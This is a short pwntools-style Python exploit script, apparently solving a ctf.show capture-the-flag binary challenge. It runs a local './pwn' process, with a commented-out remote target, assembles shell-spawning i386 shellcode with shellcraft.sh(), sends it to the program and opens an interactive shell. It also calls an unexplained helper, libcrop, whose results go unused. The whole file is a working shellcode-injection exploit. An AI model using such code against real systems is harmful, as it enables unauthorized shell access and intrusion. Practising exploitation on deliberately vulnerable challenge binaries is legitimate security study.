from kk import *
context(arch='i386', os='linux')

p = process('./pwn')
#p = remote('pwn.challenge.ctf.show', 28298)
K,L = libcrop(ELF('./pwn'))
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)

p.interactive()